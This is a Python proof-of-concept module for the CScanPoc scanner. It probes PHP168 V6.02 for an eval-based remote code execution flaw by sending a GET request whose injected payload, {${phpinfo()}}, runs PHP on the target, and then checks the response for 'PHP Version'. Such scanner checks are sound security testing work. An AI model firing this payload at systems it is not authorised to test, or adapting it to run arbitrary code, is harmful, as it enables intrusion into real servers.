# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'PHP168_0012' # 平台漏洞编号，留空
    name = 'PHP168 V6.02整站系统 远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2010-09-10'  # 漏洞公布时间
    desc = '''
        PHP168在某些函数里运用了eval函数,但是某数组没有初试化,导致可以提交任意代码执行。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'PHP168'  # 漏洞应用名称
    product_version = 'V6.02'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'ac0e540d-38cc-4db2-9d1d-510462eacfee'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer: http://www.wooyun.org/bugs/wooyun-2010-0528
            payload = '/member/post.php?only=1&showHtml_Type[bencandy][1]={${phpinfo()}}&aid=1&job=endHTML'
            verify_url = self.target + payload
            r = requests.get(verify_url)

            if r.status_code == 200 and 'PHP Version' in r.content: 
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
